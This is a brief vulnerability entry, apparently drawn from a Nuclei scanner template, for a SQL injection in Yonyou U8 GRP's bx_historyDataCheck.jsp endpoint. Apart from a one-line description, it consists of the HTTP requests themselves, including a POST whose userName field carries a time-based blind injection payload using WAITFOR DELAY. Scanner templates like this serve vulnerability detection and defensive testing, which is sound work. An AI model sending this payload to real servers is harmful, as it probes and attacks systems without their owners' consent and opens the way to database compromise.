# Vulnerability: Yonyou U8 bx_historyDataCheck - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`yonyou-u8-sqli.yaml`)

## Description
Yonyou U8 Grp contains a SQL injection vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /login.jsp HTTP/1.1
Host: {{Hostname}}

@timeout: 20s
POST /u8qx/bx_historyDataCheck.jsp HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

userName='%3bWAITFOR+DELAY+'0%3a0%3a5'--%26ysnd%3d%26historyFlag%3d
```

